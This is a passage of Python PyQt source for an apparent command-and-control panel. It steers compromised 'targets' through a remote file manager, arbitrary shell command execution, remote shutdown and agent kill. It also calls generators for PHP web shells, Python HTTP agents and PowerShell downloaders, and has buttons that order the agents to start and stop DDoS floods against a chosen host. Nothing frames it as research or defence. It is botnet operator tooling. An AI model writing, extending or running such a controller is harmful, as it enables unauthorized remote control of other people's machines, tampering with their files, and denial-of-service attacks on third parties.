            self.fm_save_btn.setEnabled(False)
            QMessageBox.information(self, "Success", "File saved successfully.")
        else:
            error_message = response.get('message', 'Failed to save file.')
            QMessageBox.critical(self, "Error", f"Could not save file:\n{error_message}")

    def fm_delete_path(self):
        selected_item = self.fm_tree.currentItem()
        if not selected_item:
            QMessageBox.warning(self, "No Selection", "Please select a file or directory to delete.")
            return

        item_name = selected_item.text(0)
        current_path = self.fm_path_input.text()
        full_path = os.path.join(current_path, item_name)

        reply = QMessageBox.question(self, "Confirm Delete", f"Are you sure you want to delete '{item_name}'?",
                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)

        if reply == QMessageBox.StandardButton.Yes:
            response = self.c2_client.delete_path(self.current_fm_target, full_path)
            if response and response.get('status') == 'success':
                self.fm_load_directory(current_path)
            else:
                error_message = response.get('message', 'Failed to delete.')
                QMessageBox.critical(self, "Error", f"Could not delete '{item_name}':\n{error_message}")

    def fm_show_context_menu(self, pos):
        menu = QMenu()
        rename_action = menu.addAction("Rename")
        delete_action = menu.addAction("Delete")
        action = menu.exec(self.fm_tree.mapToGlobal(pos))
        if action == delete_action:
            self.fm_delete_path()
        elif action == rename_action:
            self.fm_rename_path()

    def fm_rename_path(self):
        selected_item = self.fm_tree.currentItem()
        if not selected_item:
            return

        item_name = selected_item.text(0)
        current_path = self.fm_path_input.text()
        old_path = os.path.join(current_path, item_name)

        new_name, ok = QInputDialog.getText(self, "Rename", f"Enter new name for '{item_name}':", text=item_name)

        if ok and new_name and new_name != item_name:
            new_path = os.path.join(current_path, new_name)
            response = self.c2_client.rename_path(self.current_fm_target, old_path, new_path)
            if response and response.get('status') == 'success':
                self.fm_load_directory(current_path)
            else:
                error_message = response.get('message', 'Failed to rename.')
                QMessageBox.critical(self, "Error", f"Could not rename '{item_name}':\n{error_message}")

    def fm_upload_file(self):
        if not self.current_fm_target:
            QMessageBox.warning(self, "No Target", "Please select a target first.")
            return

        local_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if not local_path:
            return

        file_name = os.path.basename(local_path)
        remote_path = os.path.join(self.fm_path_input.text(), file_name)

        try:
            with open(local_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Could not read file '{local_path}':\n{e}")
            return

        response = self.c2_client.upload_file(self.current_fm_target, remote_path, content)
        if response and response.get('status') == 'success':
            self.fm_load_directory(self.fm_path_input.text())
        else:
            error_message = response.get('message', 'Failed to upload.')
            QMessageBox.critical(self, "Error", f"Could not upload file:\n{error_message}")

    def fm_create_directory(self):
        if not self.current_fm_target:
            QMessageBox.warning(self, "No Target", "Please select a target first.")
            return

        dir_name, ok = QInputDialog.getText(self, "Create Directory", "Enter directory name:")
        if ok and dir_name:
            current_path = self.fm_path_input.text()
            full_path = os.path.join(current_path, dir_name)
            response = self.c2_client.create_directory(self.current_fm_target, full_path)
            if response and response.get('status') == 'success':
                self.fm_load_directory(current_path)
            else:
                error_message = response.get('message', 'Failed to create directory.')
                QMessageBox.critical(self, "Error", f"Could not create directory:\n{error_message}")

    def fm_create_file(self):
        if not self.current_fm_target:
            QMessageBox.warning(self, "No Target", "Please select a target first.")
            return

        file_name, ok = QInputDialog.getText(self, "Create File", "Enter file name:")
        if ok and file_name:
            current_path = self.fm_path_input.text()
            full_path = os.path.join(current_path, file_name)
            response = self.c2_client.create_file(self.current_fm_target, full_path)
            if response and response.get('status') == 'success':
                self.fm_load_directory(current_path)
            else:
                error_message = response.get('message', 'Failed to create file.')
                QMessageBox.critical(self, "Error", f"Could not create file:\n{error_message}")


    def load_target_list(self):
        self._is_updating_table = True # Set flag to disable itemChanged signal
        self.target_table_widget.setRowCount(0)
        for target in self.target_manager.targets:
            row_position = self.target_table_widget.rowCount()
            self.target_table_widget.insertRow(row_position)

            # Column 0: Checkbox
            chk_box_item = QTableWidgetItem()
            chk_box_item.setFlags(Qt.ItemFlag.ItemIsUserCheckable | Qt.ItemFlag.ItemIsEnabled)
            chk_box_item.setCheckState(Qt.CheckState.Checked if target.get('is_checked', False) else Qt.CheckState.Unchecked)
            self.target_table_widget.setItem(row_position, 0, chk_box_item)

            # Other columns
            self.target_table_widget.setItem(row_position, 1, QTableWidgetItem(str(target['id'])))
            self.target_table_widget.setItem(row_position, 2, QTableWidgetItem(target['name']))
            self.target_table_widget.setItem(row_position, 3, QTableWidgetItem(target['url']))
            self.target_table_widget.setItem(row_position, 4, QTableWidgetItem(target.get('ip', 'N/A')))
            self.target_table_widget.setItem(row_position, 5, QTableWidgetItem(f"{target.get('uptime', 0)}s"))

            status_item = QTableWidgetItem()
            if target['status'] == 'online':
                status_item.setForeground(QColor("#2ECC71")) # Green
                status_item.setText("● Online")
            elif target['status'] == 'offline':
                status_item.setForeground(QColor("#E74C3C")) # Red
                status_item.setText("● Offline")
            else:
                status_item.setForeground(QColor("#F1C40F")) # Yellow
                status_item.setText("● Unknown")
            self.target_table_widget.setItem(row_position, 6, status_item)

        self._is_updating_table = False # Unset flag



    def handle_item_changed(self, item):
        if self._is_updating_table or item.column() != 0:
            return # Only handle user-initiated changes in the first column

        row = item.row()
        target_id = int(self.target_table_widget.item(row, 1).text())
        is_checked = item.checkState() == Qt.CheckState.Checked

        # Update the model
        for t in self.target_manager.targets:
            if t['id'] == target_id:
                t['is_checked'] = is_checked
                break
        
        # self.update_ddos_panel()

    def check_all_target_statuses(self):
        print("Checking all target statuses...")
        if not self.target_manager.targets:
            return
        for target in self.target_manager.targets:
            worker = HeartbeatWorker(target, self.c2_client)
            thread = QThread()
            worker.moveToThread(thread)
            thread.started.connect(worker.run)
            worker.finished.connect(self.handle_heartbeat_result)
            worker.finished.connect(thread.quit)
            thread.finished.connect(self.on_thread_finished)
            thread.start()
            self.thread_pool.append((thread, worker))

    def on_thread_finished(self):
        thread = self.sender()
        # Find and remove the thread from the pool
        for i, (t, w) in enumerate(self.thread_pool):
            if t is thread:
                self.thread_pool.pop(i)
                break
        
        # If we are in shutdown mode and this was the last thread, close the app
        if self.is_shutting_down:
            is_any_thread_running = any(t.isRunning() for t, w in self.thread_pool)
            if not is_any_thread_running:
                print("All threads finished. Closing application now.")
                QApplication.instance().quit()


    def check_target_status(self, target):
        # This function will send a heartbeat request to a single target
        # and return its status. Placeholder for now.
        heartbeat_response = self.c2_client.send_heartbeat(target)
        if heartbeat_response['status'] == 'success':
            return 'online'
        else:
            return 'offline'

    def open_add_edit_target_dialog(self, target=None):
        dialog = AddEditTargetDialog(self, target)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            data = dialog.get_data()
            if data['id'] is None:
                self.target_manager.add_target(data['name'], data['url'], data['api_key'])
            else:
                self.target_manager.update_target(data['id'], data['name'], data['url'], data['api_key'])
            self.load_target_list()

    def show_target_details(self, item):
        row = item.row()
        target_id = int(self.target_table_widget.item(row, 1).text())
        target = self.target_manager.get_target(target_id)
        if target:
            msg_box = QMessageBox(self)
            msg_box.setWindowTitle("Target Details")
            msg_box.setText(f"<b>Name:</b> {target['name']}<br>" +
                             f"<b>URL:</b> {target['url']}<br>" +
                             f"<b>API Key:</b> {target['api_key']}<br>" +
                             f"<b>IP:</b> {target.get('ip', 'N/A')}<br>" +
                             f"<b>Uptime:</b> {target.get('uptime', 0)}s<br>" +
                             f"<b>Status:</b> {target['status']}")
            
            edit_button = QPushButton(qta.icon('fa5s.edit', color='white'), " Edit")
            delete_button = QPushButton(qta.icon('fa5s.trash', color='white'), " Delete")
            shutdown_button = QPushButton(qta.icon('fa5s.power-off', color='white'), " Shutdown")
            shutdown_button.setStyleSheet("background-color: #c0392b;") # Dark red

            msg_box.addButton(edit_button, QMessageBox.ButtonRole.ActionRole)
            msg_box.addButton(delete_button, QMessageBox.ButtonRole.DestructiveRole)
            msg_box.addButton(shutdown_button, QMessageBox.ButtonRole.DestructiveRole)

            # Add Kill Agent button only if it's likely a Python agent (URL doesn't end in .php)
            if not target['url'].endswith('.php'):
                kill_agent_button = QPushButton(qta.icon('fa5s.skull-crossbones', color='white'), " Kill Agent")
                kill_agent_button.setStyleSheet("background-color: #8e44ad;") # Purple
                msg_box.addButton(kill_agent_button, QMessageBox.ButtonRole.DestructiveRole)
            else:
                kill_agent_button = None

            msg_box.addButton("Close", QMessageBox.ButtonRole.RejectRole)
            
            msg_box.exec()

            clicked_button = msg_box.clickedButton()

            if clicked_button == edit_button:
                self.open_add_edit_target_dialog(target)
            elif clicked_button == delete_button:
                if QMessageBox.question(self, "Confirm Delete", f"Are you sure you want to delete {target['name']}?",
                                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.Yes:
                    self.target_manager.delete_target(target_id)
                    self.load_target_list()
            elif clicked_button == shutdown_button:
                reply = QMessageBox.warning(self, "Confirm Shutdown", 
                                            f"Are you absolutely sure you want to shut down the target machine '{target['name']}'?\\n\\nThis action is irreversible.",
                                            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.Cancel,
                                            QMessageBox.StandardButton.Cancel)
                if reply == QMessageBox.StandardButton.Yes:
                    self.send_system_shutdown_command(target)
            elif clicked_button and clicked_button == kill_agent_button:
                reply = QMessageBox.question(self, "Confirm Kill Agent",
                                             f"Are you sure you want to terminate the agent process on '{target['name']}'?",
                                             QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
                if reply == QMessageBox.StandardButton.Yes:
                    self.send_agent_exit_command(target)

    def send_agent_exit_command(self, target):
        command = "agent_exit"
        self.stacked_widget.setCurrentIndex(1) # Switch to terminal view
        self.terminal_output.append(f'<span style="color: #8e44ad;">[KILL] Sending agent exit command to {target["name"]}...</span>')
        QApplication.processEvents()

        response = self.c2_client.send_command(target, command)
        
        if response and response.get('status') == 'success':
            self.terminal_output.append(f'<span style="color: #2ECC71;">[KILL] Response from {target["name"]}: {response.get("message")}</span>')
        else:
            error_msg = response.get('message', 'Unknown error')
            self.terminal_output.append(f'<span style="color: #E74C3C;">[KILL] Error from {target["name"]}: {error_msg}</span>')
        self.terminal_output.append("")
        self.terminal_output.verticalScrollBar().setValue(self.terminal_output.verticalScrollBar().maximum())

    def send_system_shutdown_command(self, target):
        command = "system_shutdown"
        self.stacked_widget.setCurrentIndex(1) # Switch to terminal view
        self.terminal_output.append(f'<span style="color: #E74C3C;">[SHUTDOWN] Sending shutdown command to {target["name"]}...</span>')
        QApplication.processEvents()

        response = self.c2_client.send_command(target, command)
        
        if response and response.get('status') == 'success':
            self.terminal_output.append(f'<span style="color: #2ECC71;">[SHUTDOWN] Response from {target["name"]}: {response.get("message") or response.get("output")}</span>')
        else:
            error_msg = response.get('message', 'Unknown error')
            self.terminal_output.append(f'<span style="color: #E74C3C;">[SHUTDOWN] Error from {target["name"]}: {error_msg}</span>')
        self.terminal_output.append("")
        self.terminal_output.verticalScrollBar().setValue(self.terminal_output.verticalScrollBar().maximum())

    def format_shell_output(self, text):
        # Use the converter to turn ANSI codes and newlines into HTML
        return self.ansi_converter.convert(text)

    def send_command(self):
        command = self.command_input.text()
        if not command:
            return

        selected_targets = self.get_selected_targets()
        if not selected_targets:
            self.terminal_output.append(f'<span style="color: #E74C3C;">Error: No target(s) selected.</span>')
            self.command_input.clear()
            return

        self.command_input.clear()

        for target in selected_targets:
            # Display the command prompt immediately
            self.terminal_output.append(f'<span style="color: #5DADE2;">C2@{target['name']}></span> {command}')
            QApplication.processEvents() # Force UI update

            response = self.c2_client.send_command(target, command)

            if response.get('status') == 'success':
                if response.get('output'):
                    formatted_output = self.format_shell_output(response['output'])
                    self.terminal_output.append(f'<span style="color: #2ECC71;">Output ({target['name']}):</span><br>{formatted_output}')
                if response.get('error'):
                    formatted_error = self.format_shell_output(response['error'])
                    self.terminal_output.append(f'<span style="color: #E74C3C;">Error ({target['name']}):</span><br>{formatted_error}')
            else:
                self.terminal_output.append(f'<span style="color: #E74C3C;">Command Failed ({target['name']}): {response.get('message', 'Unknown error')}</span>')
            self.terminal_output.append("") # Add a visual separator

        self.terminal_output.verticalScrollBar().setValue(self.terminal_output.verticalScrollBar().maximum())

    def handle_heartbeat_result(self, response):
        # This function is called in the main thread, so it's safe to update the data and UI
        target_id = response.get('target_id')
        if target_id is None:
            return

        for t in self.target_manager.targets:
            if t['id'] == target_id:
                if response.get('status') == 'success':
                    t['status'] = 'online'
                    t['ip'] = response.get('ip', 'unknown')
                    t['uptime'] = response.get('uptime', 0)
                    t['network_speed'] = response.get('network_speed', 0)
                    t['cpu_usage'] = response.get('cpu_usage', 0)
                    t['latency'] = response.get('latency', 0)
                    t['capabilities'] = response.get('capabilities', {})

                    # Calculate signal strength
                    if t['latency'] < 100:
                        t['signal_strength'] = 5
                    elif t['latency'] < 200:
                        t['signal_strength'] = 4
                    elif t['latency'] < 500:
                        t['signal_strength'] = 3
                    elif t['latency'] < 1000:
                        t['signal_strength'] = 2
                    else:
                        t['signal_strength'] = 1
                else:
                    t['status'] = 'offline'
                    t['ip'] = 'unknown'
                    t['uptime'] = 0
                    t['network_speed'] = 0
                    t['cpu_usage'] = 0
                    t['latency'] = 0
                    t['signal_strength'] = 0
                    t['capabilities'] = {}
                
                # Update gauges window if it is open for this target
                if self.gauges_window and self.gauges_window.target_data['id'] == target_id:
                    self.gauges_window.update_gauges(t)

                break
        # self.target_manager.save_targets() # Let's not save on every heartbeat
        self.load_target_list()

    def get_selected_targets(self):
        selected_targets = []
        for target in self.target_manager.targets:
            if target.get('is_checked', False):
                selected_targets.append(target)
        return selected_targets

    def generate_payload(self):
        payload_type = self.payload_type_combo.currentText()
        api_key = self.payload_api_key_input.text()
        obfuscate = self.obfuscate_checkbox.isChecked()

        if not api_key:
            QMessageBox.warning(self, "Warning", "API Key cannot be empty.")
            return

        generated_code = ""
        if payload_type == "PHP - Web Shell":
            generated_code = self.payload_generator.generate_php_webshell(api_key, obfuscate)
        elif payload_type == "Python - HTTP Agent":
            listen_port = self.python_listen_port_input.value()
            generated_code = self.payload_generator.generate_python_http_agent(listen_port, api_key)
        elif payload_type == "Windows - PowerShell Downloader":
            python_agent_url = self.powershell_python_agent_url_input.text()
            if not python_agent_url:
                QMessageBox.warning(self, "Warning", "Python Agent URL cannot be empty for PowerShell Downloader.")
                return
            generated_code = self.payload_generator.generate_powershell_downloader(python_agent_url, 0, api_key) # Port and API key are embedded in Python agent
        
        self.payload_output_text.setPlainText(generated_code)

    def start_ddos_attack(self):
        host = self.ddos_host_input.text()
        port = self.ddos_port_input.value()
        threads = self.ddos_threads_input.value()

        if not host:
            QMessageBox.warning(self, "Input Error", "Target Host cannot be empty.")
            return

        selected_targets = self.get_selected_targets()
        if not selected_targets:
            QMessageBox.warning(self, "No Agents Selected", "Please select one or more agents from the Targets tab.")
            return

        command = f"ddos_start {host} {port} {threads}"
        self.stacked_widget.setCurrentIndex(1) # Switch to terminal view

        for target in selected_targets:
            self.terminal_output.append(f'<span style="color: #F1C40F;">[DDoS] Sending START command to {target["name"]}...</span>')
            QApplication.processEvents()

            response = self.c2_client.send_command(target, command)
            
            if response and response.get('status') == 'success':
                self.terminal_output.append(f'<span style="color: #2ECC71;">[DDoS] Response from {target["name"]}: {response.get("message")}</span>')
            else:
                error_msg = response.get('message', 'Unknown error')
                self.terminal_output.append(f'<span style="color: #E74C3C;">[DDoS] Error from {target["name"]}: {error_msg}</span>')
            self.terminal_output.append("")

        self.terminal_output.verticalScrollBar().setValue(self.terminal_output.verticalScrollBar().maximum())

    def stop_ddos_attack(self):
        selected_targets = self.get_selected_targets()
        if not selected_targets:
            QMessageBox.warning(self, "No Agents Selected", "Please select one or more agents from the Targets tab.")
            return

        command = "ddos_stop"
        self.stacked_widget.setCurrentIndex(1) # Switch to terminal view

        for target in selected_targets:
            self.terminal_output.append(f'<span style="color: #F1C40F;">[DDoS] Sending STOP command to {target["name"]}...</span>')
            QApplication.processEvents()

            response = self.c2_client.send_command(target, command)

            if response and response.get('status') == 'success':
                self.terminal_output.append(f'<span style="color: #2ECC71;">[DDoS] Response from {target["name"]}: {response.get("message")}</span>')
            else:
                error_msg = response.get('message', 'Unknown error')
                self.terminal_output.append(f'<span style="color: #E74C3C;">[DDoS] Error from {target["name"]}: {error_msg}</span>')
            self.terminal_output.append("")
            
        self.terminal_output.verticalScrollBar().setValue(self.terminal_output.verticalScrollBar().maximum())


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = C2Panel()
    window.show()
    sys.exit(app.exec())

    